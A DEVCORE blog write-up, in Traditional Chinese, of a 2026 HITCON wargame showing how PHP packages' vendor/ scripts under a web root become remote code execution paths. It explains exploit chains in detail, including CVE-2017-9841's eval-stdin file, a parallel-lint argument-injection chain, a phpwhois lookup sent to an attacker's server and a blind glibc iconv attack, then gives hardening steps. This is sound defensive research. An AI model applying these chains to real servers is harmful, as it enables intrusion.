---
title: 當 vendor/ 成為攻擊面：2026 HITCON x DEVCORE Wargame 回顧 | DEVCORE 戴夫寇爾
source: https://devco.re/blog/2026/10/08/vendor-as-attack-surface-2026-hitcon-wargame/
source_host: devco.re
clip_date: 2026-10-08T18:49:47+08:00
trace_id: c3536c15-5417-4fe7-a7f7-c3937b009a33
content_hash: 8cd603d8eb9beed3c798167fef2614d6fb9e5e2de797684534b02fc893d4c55a
status: synced
tags:
  - 漏洞分析
  - CTF
series: null
feed_source: DEVCORE
ai_summary: "**TL;DR：** 把整包 PHP 專案連 `vendor/` 一起放進網站根目錄，加上 PHP Docker image 預設的 `register_argc_argv=On`，會讓 167 個熱門套件中 53 個（近 1/3）的 CLI 腳本變成可從 Web 觸發的 RCE 入口。"
ai_summary_style: key-points:weak
images_status:
  total: 1
  succeeded: 1
  failed_urls: []
notion_page_id: 3f375244-d011-818c-909f-e562f6db3189
ioc:
  cves:
    - CVE-2017-9841
    - CVE-2024-2961
  cwes: []
  hashes: []
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points:weak）**
>
> **TL;DR：** 把整包 PHP 專案連 `vendor/` 一起放進網站根目錄，加上 PHP Docker image 預設的 `register_argc_argv=On`，會讓 167 個熱門套件中 53 個（近 1/3）的 CLI 腳本變成可從 Web 觸發的 RCE 入口。
> 
> - **規模與結果：** 取 Packagist 上 500 star、10 萬下載以上的套件，在 PHP 7.4.33／8.4 各開一題共 282 題；58 個帳號、2,291 次提交中攻破 82 題、53 個套件，其中 52 個拿到 `/readflag`。
> - **關鍵設定失誤：** `register_argc_argv` 內建預設是 `On`，官方 `php.ini-production/development` 雖寫 `Off`，但 `php:*-apache` image 只複製範本不啟用，於是 query string 進到 `$_SERVER['argv']`，CLI 腳本被 Apache 執行時也拿得到參數。
> - **相依套件才是破口：** 53 個被攻破的套件裡有 16 個自身程式無問題，是靠別人的洞；`phpunit/phpunit` 的 `eval-stdin.php`（CVE-2017-9841，54 bytes）打下 zendframework、doctrine 系列。
> - **升版反而降版：** PHP 從 7.4 升到 8.4 後重解相依，因 PHPUnit 5.2.8 起宣告 `^5.6 || ^7.0` 排除 PHP 8，Composer 反而選中 2016 年、未修補的 5.2.7。
> - **常見串洞手法：** `session.upload_progress`（44 題）、`php://filter` iconv 鏈（41 題）、PEAR `pearcmd.php config-create`（27 題）、request body 暫存檔配 `/proc/self/fd`（18 題）。
> - **精彩利用：** php-parallel-lint 用 `escapeshellcmd` 無法擋額外參數，把 `--git` 依次換成 `flock`、`gcc`、自製 `a.out` 三輪串接，最後讓 flag 落在 `author` 欄位被 regex 印出；pay-sdk 一題僅 1 次成功，靠 error-based oracle 配 glibc CVE-2024-2961，並以執行時間當無回顯的回傳值。
> - **防禦：** DocumentRoot 指向 `public/`、明確設 `register_argc_argv=Off` 與關閉 `session.upload_progress`、移除 PEAR、CLI 入口加 `PHP_SAPI !== 'cli'` 檢查；`.htaccess` 封鎖規則須 AllowOverride 與模組配合才生效。

[技術專欄](https://devco.re/blog/category/%E6%8A%80%E8%A1%93%E5%B0%88%E6%AC%84)

## 當 vendor/ 成為攻擊面：2026 HITCON x DEVCORE Wargame 回顧

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/9851f935ec21de26.jpg)

* * *

### 前言

我們平常使用 Composer 安裝套件時，很容易把 `vendor/` 當成單純存放 library code 的目錄。裡面的程式碼開源，又被很多人 review 過，直覺上好像不太會有什麼安全問題。

但如果整個專案目錄都位於 web root 下，就會有意外了。這裡面通常還有安裝腳本、測試 runner、code generator，這些檔案如果能被直接從 Web 存取，並交給 PHP 執行，就可能變成不需經過應用程式登入流程的 endpoint。如果環境還會把 query string 放進 `$_SERVER['argv']` ，更會增加被攻擊的可能。

我們在真實紅隊演練專案裡就有遇到這樣的例子，因為設定疏失讓 `vendor/` 目錄暴露在網站根目錄下，我們又在對方使用的套件裡找到漏洞，最終成功拿下一台主機。

> 如果把真實世界的 Composer package 與完整 dependency tree 丟到網頁根目錄下，攻擊者究竟能把多少「不是為 Web 設計的功能」組成 exploit？

這是個有趣的開放性問題，我們很想知道這個設定疏失到底會讓多少套件發生意外，也想知道大家會怎麼巧妙串洞，於是出了這次的題目。這次的靈感來自同事 lys 在專案中發現的漏洞，也感謝他一手規劃和建置了這次的 Wargame。

### AI 時代，AI 的玩法

從今年開始，資安競賽的題目變得很難出。AI 解題速度太快，能力太強，想設計一道「只有人類解得出來」的好題目，已經不太現實。

既然終究都要燒 token，我認為未來出題目就應該挑那些過去真的卡住全人類的技術困境，趁著一群聰明的腦袋加上 AI 都在參加活動，一次解完一個難題，豈不是美事一樁。這次就是這個想法：用比賽產出一份 package 清單，以後只要在網頁目錄下看到清單上的套件，就知道那台機器有機會直接打下來。

果然，幾乎所有參賽者都是用 AI 解的 XD 一個有趣的小數據：有六個帳號在 payload 裡拿 `codex` 當變數名或標記字串，另外有一個帳號的註解裡寫著 `CLAUDE.md` 。這也稍微反映了 2026.08 參賽者對模型的偏好。

這裡也有一個小作弊的方法：因為只要知道哪個套件有問題，大部分 AI 都能找到洞。於是有人寫程式監控前幾名的分數變化，看加了多少分回推是哪一個套件有問題，再丟給 AI 解，這樣就能把 token 花在已知有解的題目上。這是預期內會有的玩法，不過第二天我們還是在計分板上把分數後三碼遮掉，免得影響最終戰局。算是個小插曲。

那有真人手打的嗎？從提交時間和程式碼痕跡交叉比對，大概還是有三位偏手動，而且都只解了一題。希望他們有享受到手捏 payload 的快樂！！解這個其實還滿好玩的，也可以練到功。

### 前 167 名熱門套件，53 個被打穿

比賽規則很簡單：我們從 [Packagist](https://packagist.org/) 撈出 500 star 和十萬次下載以上的 PHP 套件，每個套件在 PHP 7.4.33 和 8.4 兩種環境下各開一題，用官方 `php:*-apache` image 加 `composer install` 建起來，參賽者提交一支 exploit script。Judge 會在隔離環境中執行該 script， `/flag1` 是可讀檔案、 `/readflag` 是 setuid 執行檔。讀到 flag1 算部分分數，拿到 flag2 才是完整攻破。（ [題目備份](https://github.com/DEVCORE-Wargame/HITCON-2026/) ）

最後的數據：

| 項目  | 數據  |
| --- | --- |
| 題目  | **282** 題（167 個套件 × PHP 版本，2 個套件在特定版本裝不起來） |
| 參賽帳號 | **58** 個，其中 40 個有解題成功 |
| 提交次數 | **2,291** 次，其中 **1,466** 次有得分 |
| 攻破  | **82** 題 / **53** 個套件 |
| 完整攻破 | 53 個裡有 52 個拿到 `/readflag` |

被打穿的套件裡，star 數最高的前 10 名是這樣（star 取比賽當時的快照）：

| #   | 套件  | star | 被打穿的入口 |
| --- | --- | --- | --- |
| 1   | [symfony/symfony](https://github.com/symfony/symfony) | 31,410 | [`.github/build-packages.php`](https://github.com/symfony/symfony/blob/v5.4.53/.github/build-packages.php) |
| 2   | [pestphp/pest](https://github.com/pestphp/pest) | 11,605 | [`bin/worker.php`](https://github.com/pestphp/pest/blob/v5.0.2/bin/worker.php) |
| 3   | [rector/rector](https://github.com/rectorphp/rector) | 10,405 | [`bin/rector.php`](https://github.com/rectorphp/rector/blob/2.5.9/bin/rector.php) |
| 4   | [vrana/adminer](https://github.com/vrana/adminer) | 7,483 | [`adminer/sqlite.php`](https://github.com/vrana/adminer/blob/v5.5.1/adminer/sqlite.php) |
| 5   | [zendframework/zendframework](https://github.com/zendframework/zendframework) | 5,799 | **別人的** [`phpunit/phpunit` 的 `eval-stdin.php`](https://github.com/sebastianbergmann/phpunit/blob/5.2.7/src/Util/PHP/eval-stdin.php) |
| 6   | [codeception/codeception](https://github.com/Codeception/Codeception) | 4,912 | [`app.php`](https://github.com/Codeception/Codeception/blob/5.3.5/app.php) |
| 7   | [doctrine/migrations](https://github.com/doctrine/migrations) | 4,806 | [`bin/doctrine-migrations.php`](https://github.com/doctrine/migrations/blob/3.9.7/bin/doctrine-migrations.php) |
| 8   | [doctrine/doctrine-migrations-bundle](https://github.com/doctrine/DoctrineMigrationsBundle) | 4,339 | **別人的** `doctrine/migrations` 的 bin |
| 9   | [symfony/symfony-demo](https://github.com/symfony/demo) | 2,604 | **別人的** `doctrine/migrations` 的 bin |
| 10  | [brianium/paratest](https://github.com/paratestphp/paratest) | 2,496 | [`bin/phpunit-wrapper.php`](https://github.com/paratestphp/paratest/blob/v7.23.1/bin/phpunit-wrapper.php) |

被打穿的套件清單請參考這次釋出的 [Scoreboard Matrix](https://github.com/DEVCORE-Wargame/HITCON-2026/blob/main/matrix.md) 。

出現在榜單裡的套件幾乎都是知名套件，不介紹太多。這張表最值得看的是第 5、8、9 名， **它們被打的入口根本不是自己的檔案**。

#### 升級 PHP，卻裝回 2016 年的 PHPUnit

`zendframework/zendframework` 是被 `phpunit/phpunit` 的 `eval-stdin.php` 打下來的，而整個檔案只有 54 bytes：

```php
eval('?>' . file_get_contents('php://input'));
```

這是 [CVE-2017-9841](https://nvd.nist.gov/vuln/detail/CVE-2017-9841) ，2017 年的老洞，2022 年 2 月進了 [CISA 的 KEV 目錄](https://www.cisa.gov/known-exploited-vulnerabilities-catalog) ，那是美國 CISA 維護的清單，收錄標準是「有證據顯示正在被實際利用」。

它會躺在 2026 年的 `vendor/` 裡，是三件事疊起來的結果。

**第一，測試工具被寫進正式相依。** `zendframework/zendframework` [2.5.2 的 `require`](https://github.com/zendframework/zendframework/blob/release-2.5.2/composer.json) 列了 51 個 Zend 套件，其中一個是 `zendframework/zend-test` 。而 [zend-test 2.5.3](https://github.com/zendframework/zend-test/blob/release-2.5.3/composer.json) 把 PHPUnit 列在 `require` 裡：

```json
"require": {
    "php": ">=5.5",
    "phpunit/phpunit": "~4.0|~5.0",
    ...
}
```

這代表它是正式相依套件，不是只在開發時才裝，就算 `composer install --no-dev` 也會裝到。

**第二，升級 PHP 反而把相依套件的版本往下推。** `~5.0` 等於 `>=5.0 <6.0` ，但 PHPUnit 5.x 從 [5.2.8](https://github.com/sebastianbergmann/phpunit/blob/5.2.8/composer.json) 起，宣告的 PHP 版本範圍改成 `^5.6 || ^7.0` ，排除了 PHP 8。反而 [5.2.7](https://github.com/sebastianbergmann/phpunit/blob/5.2.7/composer.json) 只寫 `>=5.6` ，沒有設上限。於是在這題 PHP 8.4 的建置流程裡，Composer 重新解析相依時，最後選中了 **5.2.7**，那是十年前、2016 年的版本。

**第三，那支檔案在 5.2.7 裡是有洞的。** CVE 的修補版本是 4.8.28 和 5.6.3。

**把 PHP 從 7.4 升到 8.4，反而讓這個相依套件掉回 2016 年。** 舊版沒有設定 PHP 版本上限，反而成了符合條件的版本。這裡是重新解析相依套件的結果。如果沿用原本的 `composer.lock` ， [`composer install`](https://getcomposer.org/doc/03-cli.md#install-i) 會照 lock 安裝，不會只因升級 PHP 就自動降版。

至於 `doctrine/doctrine-migrations-bundle` 和 `symfony/symfony-demo` ，它們單純是被 `doctrine/migrations` 那支 bin 打的，反而自己的程式在這次比賽都沒有發現問題。

#### 小結

三件值得記下來的事：

1.  這次挑出來的熱門 PHP 套件，有接近 1/3 套件在設定錯誤的情況下可以拿來攻擊利用。這說明 `vendor/` 裡的 PHP 檔案一旦能被直接從 Web 執行，就有機會被拿來取得控制權。
2.  自己沒有洞不代表安全。53 個裡有 16 個主程式在這次都沒發現問題，是被相依套件害的。而 `phpunit/phpunit` 自己沒被攻破，卻因為舊版本漏洞打下了三個別人的套件。
3.  升級 runtime，不代表相依套件也會跟著變安全。把 PHP 從 7.4 升到 8.4，反而讓 Composer 在重新解析相依時，選中一個 2016 年、尚未包含該漏洞修補的 PHPUnit 版本，讓這個漏洞重生。

### 攻擊手法：從基本功到漂亮的串洞

比賽結束後，我們分析了 1,280 份成功的 exploit，主要有兩類問題：

第一類，套件自己就有命令執行功能。像 [Symfony](https://github.com/symfony/symfony/blob/v5.4.53/.github/build-packages.php#L9-L19) 就可以看到一個 `shell_exec` 、一個 `system` 、四個 `passthru` 把 `$_SERVER['argv']` 吃進去。這些程式原本沒預期會從 Web 執行，所以也沒有相對應的保護。有 18 題屬於這類狀況。

第二類，是可以任意包含檔案，或具有讀、寫檔能力的入口。下面這幾招多半是搭配 `include/require` ，把可控內容變成會執行的 PHP 程式碼，全部是 CTF 的基本功：

| 手法  | 用在幾題 | 參考資料 |
| --- | --- | --- |
| `session.upload_progress` 寫出名稱可預測的 session 檔 | 44  | [Orange Tsai, HITCON CTF 2018 One Line PHP Challenge](https://blog.orange.tw/posts/2018-10-hitcon-ctf-2018-one-line-php-challenge/) |
| `php://filter` 的 iconv 鏈 | 41  | [Synacktiv, PHP filters chain](https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it) |
| PEAR 的 `pearcmd.php config-create` | 27  | [PayloadsAllTheThings: LFI to RCE](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/LFI-to-RCE.md#lfi-to-rce-via-php-pearcmd) |
| request body 的暫存檔配 `/proc/self/fd` | 18  | [PHP request body](https://github.com/php/php-src/blob/php-7.4.33/main/SAPI.c#L265) 、 [temp stream](https://github.com/php/php-src/blob/php-7.4.33/main/streams/memory.c#L371) 、 [proc_pid_fd](https://man7.org/linux/man-pages/man5/proc_pid_fd.5.html) |

接下來看幾個有趣的解法。

#### 經典解析不一致

[`phpwhois/phpwhois`](https://github.com/phpwhois/phpwhois) 的主要 payload 只有一行：

```python
payload = f"x.{callback_ip}\x00.a.gtld"
```

在 PHP 7.4.33 這題裡，phpWhois 在選 parser 時，看到這個字串以 `.gtld` 結尾，所以選中 gtld 的解析器；但 [探測 WHOIS server](https://github.com/phpWhois/phpWhois/blob/45f46482d8197ec18f5fff47d2b51d422af9c7a4/src/whois.main.php#L214) 和 [建立連線](https://github.com/php/php-src/blob/php-7.4.33/ext/standard/fsock.c#L65) 時，底層 C 函式會在 NUL 處截斷，連到的是攻擊者的機器。於是攻擊者自己架一個假 WHOIS 伺服器等它上門，再回傳惡意欄位，觸發 parser 裡既有的 [PHP 程式碼注入](https://github.com/phpWhois/phpWhois/blob/45f46482d8197ec18f5fff47d2b51d422af9c7a4/src/whois.parser.php#L370) ，就能進一步執行指令。

#### 受限制的指令注入鏈

[`php-parallel-lint`](https://github.com/JakubOnderka/PHP-Parallel-Lint) 這題只有兩個人解出來。它有一個 `--blame` 功能：lint 到錯誤時順便跑 `git blame` ，告訴你那一行是誰寫的。 [組指令的程式碼](https://github.com/JakubOnderka/PHP-Parallel-Lint/blob/v1.0.0/src/Process/GitBlameProcess.php#L15) 長這樣：

```php
// src/Process/GitBlameProcess.php:15
$cmd = escapeshellcmd($gitExecutable) . " blame -p -L $line,+1 " . escapeshellarg($file);
```

先把這題簡化： `$gitExecutable` 和 `$file` 都可以控制。 `escapeshellcmd()` 會跳脫 `;`、 `|` 這類 shell 特殊字元，但 [仍可加入額外參數](https://www.php.net/manual/en/function.escapeshellcmd.php) 。這份解法就把 Git 換成其他程式，讓它們吃下原本給 Git 的參數。不管換成什麼，後面都會接上：

```
<我指定的程式> blame -p -L 0,+1 '<我指定的檔名>'
```

接下來的問題就是： **系統裡有哪些程式，吃下這組參數後，會做出對攻擊有用的事？**

在那之前，先得讓 `--blame` 被觸發。解法在每輪請求都加上 parallel-lint 的 `-a` ，讓它以 `-d asp_tags=On` 啟動 PHP。但 `asp_tags` [早在 PHP 7.0 就被移除](https://www.php.net/manual/en/migration70.incompatible.php) ，PHP 7.4.33 因此在啟動時就 [報出「第 0 行」的 fatal error](https://github.com/php/php-src/blob/php-7.4.33/main/main.c#L2434) 。parallel-lint 仍會把這個錯誤交給 blame 處理，後面的參數也就固定成 `-L 0,+1` ，不必真的在檔案裡製造語法錯誤。

另一個準備是上傳預先編譯、尚未連結成執行檔的 ELF object，再從 [`session.upload_progress`](https://www.php.net/manual/en/session.upload-progress.php) 的 session 紀錄讀出它在伺服器上的暫存檔路徑。接著趁暫存檔還在，對同一支 `parallel-lint.php` 送出三輪請求，分別調整 `--git` 和要 lint 的檔案。下面以 x86-64 的流程為例。

**第一輪，讓 `flock` 留下一個空檔案。**

把 `--git` 設成 `/usr/bin/flock` ，要 lint 的檔案指定為 `/flag1` ，組出來的指令就是：

```
$ flock blame -p -L 0,+1 /flag1
flock: failed to execute -p: No such file or directory
```

`flock` 的用法是 `flock <鎖檔> <要執行的程式> [參數...]` 。因此它把 `blame` 當成鎖檔，先開啟檔案並上鎖，再嘗試執行名叫 `-p` 的程式。只要工作目錄可寫，它就會 [建立原本不存在的 `blame`](https://kernel.googlesource.com/pub/scm/utils/util-linux/util-linux/+/refs/tags/v2.30.1/sys-utils/flock.c) 。雖然後面執行失敗，但空檔案已經留下，下一輪正好拿來當輸入。

**第二輪，讓 `gcc` 把上傳的 object 連結成可執行檔。**

這次把 `--git` 換成 `/usr/bin/gcc` ，要 lint 的檔案換成剛才找到的上傳暫存檔：

```
$ gcc blame -p -L 0,+1 /tmp/php8kQ2mR
```

原本給 Git 的參數，到了 [GCC 和 linker](https://gcc.gnu.org/onlinedocs/gcc/Link-Options.html) 這裡剛好都能解釋得通：

| 參數  | GCC 與 linker 怎麼處理 |
| --- | --- |
| `blame` | 第一個輸入檔。GCC 交給 linker，GNU `ld` 無法辨識格式時會 [改當 linker script](https://sourceware.org/binutils/docs/ld/Implicit-Linker-Scripts.html) ；空檔也能接受。 |
| `-p` | GCC 支援的 [profiling 選項](https://gcc.gnu.org/onlinedocs/gcc-12.4.0/gcc/Instrumentation-Options.html) 。 |
| `-L 0,+1` | 把 `0,+1` 當成 [library 搜尋目錄](https://gcc.gnu.org/onlinedocs/gcc/Directory-Options.html) ，這裡不影響連結。 |
| `/tmp/php8kQ2mR` | 第二個輸入檔，內容就是攻擊者上傳的 ELF object。 |

上傳的 object 還沒連結成執行檔，PHP 的上傳暫存檔也沒有執行權限，直接把 `--git` 指過去跑不動。借 GCC 完成連結後，工作目錄裡就會產生具有執行權限的 `a.out` 。第一輪如果沒先建立 `blame` ，這裡就會因為找不到輸入檔而失敗。

原 exploit 也準備了 AArch64 版本的 object，這一輪改用 `/usr/bin/ld` 。 [AArch64 的 GNU `ld` 保留了相容用的 `-p` 選項](https://gnu.googlesource.com/binutils-gdb/+/refs/tags/binutils-2_35/ld/emultempl/aarch64elf.em) ，收到後會忽略，因此同樣能吃下這組參數。

**第三輪，執行自己的程式，把 flag 塞進作者欄位。**

最後把 `--git` 指向剛產生的 `a.out` 。這時執行的是攻擊者自己的程式，後面附上的 blame 參數就不必照 Git 的意思處理了。

但拿到 `/readflag` 的輸出還不夠，因為 parallel-lint 會解析子行程的輸出，再挑出 blame 欄位放進錯誤報告。 **flag 得放進一個會被印出來的欄位。**

所以這支程式先把格式正確的 commit、email、時間等必要欄位確實寫入 stdout，最後寫出 `author` ，刻意不換行，再透過 [`execve()`](https://www.man7.org/linux/man-pages/man2/execve.2.html) 執行 `/readflag` 。 `execve()` 成功後，原程式不會繼續往下執行，所以其他欄位得先輸出；而 `/readflag` 會沿用原本的 stdout，flag 就直接接在 `author` 後面：

```
author FLAG{...}
```

parallel-lint [擷取作者名稱](https://github.com/JakubOnderka/PHP-Parallel-Lint/blob/v1.0.0/src/Process/GitBlameProcess.php#L38) 用的是這個 regex：

```php
preg_match('~^author (.*)~m', $output, $matches);
```

這個 regex 會把行首 `author` 後面到行尾的文字當成作者名稱，不需要再補結尾符號。 **flag 就這樣被當成作者名稱，印進了 [錯誤報告](https://github.com/JakubOnderka/PHP-Parallel-Lint/blob/v1.0.0/src/ErrorFormatter.php#L95) 。**

這題漂亮的地方，是把同一組固定參數交給不同程式解讀；能控制要啟動的程式時，光擋 shell 特殊字元還不夠。

#### file_get_contents：熟悉的套路，難搞的環境

[`yurunsoft/pay-sdk`](https://github.com/Yurunsoft/PaySDK) 是全場最難的一題， **只有一個人嘗試解這題，238 次提交，只成功 1 次**。

入口是套件附的一支下載憑證用的 CLI 工具，而 [能利用的就只有一個參數可控的 `file_get_contents()`](https://github.com/Yurunsoft/PaySDK/blob/v3.1.8/src/Weixin/SDKV3.php#L139) ：

```php
openssl_get_privatekey(file_get_contents($this->publicParams->keyPath))
```

這個環境的 `argv` 來自 query string， [CLI 工具會從中解析參數](https://github.com/Yurunsoft/PaySDK/blob/v3.1.8/src/Weixin/Tool/CertificateDownloader.php#L54-L66) ，所以請求長這樣（ `codex` 佔 `argv[0]` ， `-k` 、 `-m` 、 `-s` 塞 `x` 應付必填檢查）：

```
/vendor/yurunsoft/pay-sdk/src/Weixin/Tool/CertificateDownloader.php
  ?codex+-k+x+-m+x+-f+php://filter/<chain>/resource=/proc/self/maps+-s+x+-o+/tmp
```

讀到的內容直接餵進 OpenSSL，不會印出來， **有任意檔案讀取，但沒有回顯。** 對 CTFer 來說，套路算熟悉：用 [Synacktiv 的 error-based oracle](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle) 從 `/proc/self/maps` 問出位址線索，再利用題目環境中尚未修補的 glibc 漏洞 [CVE-2024-2961](https://blog.lexfo.fr/iconv-cve-2024-2961-p1.html) 做 RCE。 [無回顯的利用方式](https://blog.lexfo.fr/iconv-cve-2024-2961-p3.html) 和 [cnext-exploits](https://github.com/ambionics/cnext-exploits) 都已經公開，路線不難想到，難的是在這個環境裡真的跑成功。

第一個問題是，前面讀到的位址，到了後面的利用階段還得能用。但 Apache 跑的是 [`prefork`](https://httpd.apache.org/docs/2.4/mod/prefork.html#minspareservers) ，開新連線就可能換一個 child，先前處理過的請求也會影響 heap 佈局。解題者先用一批半截 HTTP header 佔住既有 child，促使 Apache 補出新的，減少舊請求的影響；需要連續探測時，再沿用同一條 [Keep-Alive](https://httpd.apache.org/docs/2.4/mod/core.html#keepalive) 連線，讓這條連線內的請求由同一個 child 處理。連 Apache 補 worker 的機制都拿來用了。

另一個麻煩是，oracle 本身會改變要讀的資料。glibc 的編碼轉換模組會在 `iconv` 用到時才 [載入](https://codebrowser.dev/glibc/glibc/iconv/gconv_dl.c.html#114) ，而這題的 oracle 又是 iconv 堆出來的。一邊讀 maps，一邊又讓 maps 的內容跟著變，瞄準器讀到一半就不準了。解題者的辦法是先暖機：把後面會用到的轉換先跑過一遍，減少首次載入造成的變動，再開始找位址。

逐字問位址的成本也很高。最後的版本先只讀出一個函式庫的位址當基準，再推算 libc 與 heap 的候選位址，優先測試有關聯的組合。讀出的字元也要重複確認，避免一個錯字把後面整串判斷帶歪。

最大的問題還是，連 exploit 的除錯輸出都看不到。系統只給判題結果和執行時間，不回 stdout，也沒有外網可以 callback。失敗到底是 oracle 沒問對、位址找不到，還是後面的利用出問題，光看 WA 根本無從判斷。接下來就是整題最漂亮的一手：既然看不到 stdout，就 **把執行時間當成回傳值**。

參賽者把走到哪個檢查點、哪個候選符合條件，編成不同的總執行時間；還會扣掉探測已花掉的時間，再補到指定長度，減少探測快慢對答案的干擾。這樣就算提交失敗，也有機會帶回線索，知道下次該查哪裡。而比賽系統限制每五分鐘才能 submit 一次答案，也就是五分鐘才能問一個問題，所以最後這個參賽者又開了四個分身，用五個帳號增加問事效率 XD

最後解題者從 08-21 21:50 → 08-22 13:56，連續問事 **16.1 小時**，其實他的分身在 08-22 10:26 就取得 AC，耗費 12.6 小時、130 次 submit。但這位解題者後來又跑了 3 小時 30 分（107 次），卻沒有第二次成功，猜是想讓本尊也拿到分數，可惜最後運氣不好。

這題的門檻也就在這裡：得先想辦法讓失敗的提交帶回線索，再把環境帶來的限制一個個處理掉，熟悉的套路才有機會跑成功。想法和毅力都讓人佩服，這大概是 AI 時代才有的勇氣，願意花這麼多時間一路解下去 XD

### 回到部署：為什麼打得進來，又該怎麼擋？

#### PHP Docker image：範本寫 Off，實際卻是 On

這次能串出這麼多利用鏈，有一半的原因是 `register_argc_argv` 這個 PHP 設定讓 query string 進到 `$_SERVER['argv']` 裡面，於是一支原本只在終端機跑的 CLI 腳本，被 Apache 執行時也拿得到「命令列參數」。

比較意外的是，PHP 的 [內建預設值](https://www.php.net/manual/en/ini.core.php#ini.register-argc-argv) 其實是 `On` ，但 [`php.ini-production`](https://github.com/php/php-src/blob/PHP-8.4/php.ini-production#L676) 和 [`php.ini-development`](https://github.com/php/php-src/blob/PHP-8.4/php.ini-development#L674) 兩份官方範本都把它設成 `Off` 。官方的 `php:*-apache` Docker image [只把 ini 範本複製到目錄裡](https://github.com/docker-library/php/blob/master/8.4/bookworm/apache/Dockerfile#L262) ，沒有啟用其中任何一份；如果部署也沒有另外覆寫，就會維持內建的 `On` 。

**這點值得特別提醒，因為 `FROM php:8-apache` 是很常見的部署方式，沒有另外調整設定，就會把這個預設值一起帶進自己的環境。** 我們在平台測試題目時就注意到這個狀況，最後決定保留 `On` ，讓大家多一些可以串洞的機會。

這裡要從 Apache 實際處理的請求確認，不能只在容器裡跑 `php -r` ，因為 [CLI SAPI 本身就會把這個設定設成 `true`](https://www.php.net/manual/en/features.commandline.differences.php) 。可以讓 Apache 執行下面這段 PHP，一次看清楚執行環境與設定來源：

```php
var_export([
    'sapi' => PHP_SAPI,
    'register_argc_argv' => ini_get('register_argc_argv'),
    'php_ini' => php_ini_loaded_file(),
    'extra_ini' => php_ini_scanned_files(),
    'include_path' => get_include_path(),
]);
```

`php_ini_loaded_file()` 只告訴你有沒有載入主 `php.ini` ，其他附加設定檔要看 [`php_ini_scanned_files()`](https://www.php.net/manual/en/function.php-ini-scanned-files.php) 。至於一些利用鏈裡出現的 `pearcmd.php` ，則來自 image 附帶的 PEAR，就放在 `include_path` 包含的 `/usr/local/lib/php` 裡。

所以， `FROM php:8-apache` 再 `COPY . /var/www/html` ，如果沒有調整 DocumentRoot 或另外限制 `vendor/` 存取，就可能把這些 CLI 腳本一起變成 Web 入口。

#### 為什麼 vendor/ 會被公開？

講到最後一定有人想問：把整個專案丟進網頁根目錄，這不是基本錯誤嗎？為什麼還會發生？因為有些軟體的部署方式，本來就把內部程式一起放進網站目錄，再靠 Web server 的設定擋住。

例如 Zabbix 7.4 的 [原始碼安裝文件](https://www.zabbix.com/documentation/7.4/en/manual/installation/install) ，就要求把 `ui/` 複製到網站目錄：

```bash
mkdir <htdocs>/zabbix
cd ui
cp -a . <htdocs>/zabbix
```

不過，Zabbix 官方也有提供 [Nginx 封鎖 `/vendor` 的設定](https://www.zabbix.com/documentation/7.4/en/manual/installation/known_issues) 。照這種方式安裝，存取限制也要一起設好。如果只把檔案放進去，卻沒有套用對應的規則， `vendor/` 就可能一起被公開。

另一類是 **舊的部署方式留了下來**。Moodle 在 5.1 之前，整份程式碼都放在 web root 裡， [5.1 才改成只公開 `public/`](https://docs.moodle.org/501/en/Upgrading#Code_directories_restructure) 。官方也特別提醒，升級時必須一起修改 DocumentRoot。上游把目錄改好了，伺服器也要跟著調整。

第三類最冤： **上游其實放了保護，但保護沒生效。** [Roundcube 1.6.x](https://github.com/roundcube/roundcubemail/blob/1.6.11/.htaccess#L8-L15) 、 [LimeSurvey](https://github.com/LimeSurvey/LimeSurvey/blob/d57eac53b2f61fac34bb9c5dcbb2c4c29658f8e2/.htaccess#L35-L36) 、 [MediaWiki](https://github.com/wikimedia/mediawiki/blob/d9ea5cc1f0e8d9f1be68bb640361c36792183e04/includes/composer/ComposerVendorHtaccessCreator.php#L23-L47) 、 [PrestaShop](https://github.com/PrestaShop/PrestaShop/blob/8.2.1/vendor/.htaccess) 、 [DokuWiki](https://github.com/dokuwiki/dokuwiki/blob/ab1349690553fb0c339a042c6b4e12c7607334c4/vendor/.htaccess) 、 [MantisBT](https://github.com/mantisbt/mantisbt/blob/f481c157400eebb709a044527e1fb3dd15203709/vendor/.htaccess) 、 [October CMS](https://github.com/octobercms/october/blob/3a8e78a6c43e91864376be323facff4a8d3dc48d/.htaccess#L40-L50) 都有預設的封鎖規則，但那些規則寫在 `.htaccess` 裡－ **必須讓 Apache 允許相關指令，並啟用需要的模組，才會生效** （ [Apache 官方說明](https://httpd.apache.org/docs/2.4/howto/htaccess.html) ）。換到 Nginx 或 IIS 而沒有補上等價規則，保護就是不存在的。

#### 先關掉 vendor/ 的 Web 入口

可以從部署、PHP 設定和套件本身下手，先擋入口，再減少串洞的機會。

**部署層－讓 `vendor/` 無法從 Web 存取。** 軟體有 `public/` 設計，就把 DocumentRoot 指向那裡，讓 `vendor/` 留在外面。這可以擋掉本文直接請求套件腳本的入口。既有軟體無法調整目錄，就依官方部署方式，在 Web server 設定裡限制內部目錄的存取。只關目錄列表，或只擋 `installed.json` ，其他檔案仍可能被直接存取。

**環境層－關掉不需要的功能。** 明確設定 `register_argc_argv = Off` ，避免 query string 被當成命令列參數；沒有用到上傳進度，就設定 `session.upload_progress.enabled = Off` ；不需要 PEAR，就把相關工具移除。這些能讓部分串洞方式失效，但擋不住所有解法。使用官方 PHP Docker image 時，記得 [啟用 `php.ini-production`](https://github.com/docker-library/docs/blob/master/php/README.md#configuration) ，並確認 Apache／FPM 實際載入的設定。

**套件層－CLI 工具先確認執行環境。** 只供 CLI 使用的獨立 `.php` 入口，在處理參數或執行功能之前加上：

```php
if (PHP_SAPI !== 'cli') { exit; }
```

我們在題庫裡就看過 [`if (!php_sapi_name() == 'cli')`](https://github.com/hisune/Echarts-PHP/blob/1.1.3/src/Doc/AutoGenerate.php#L13-L15) 這種寫法，`!` 會先算，反而讓預期的阻擋失效。直接用 `PHP_SAPI !== 'cli'` ，簡單又清楚。

另外，可以用 [`.gitattributes` 的 `export-ignore`](https://getcomposer.org/doc/02-libraries.md#light-weight-distribution-packages) ，把只供測試、建置或維護使用的檔案排除在 dist 發行包之外；套件正常功能需要的 `bin/` 還是要保留。不過，從 source 安裝時仍可能拿到那些檔案，所以不能只靠打包規則防止 Web 存取。

### 結語

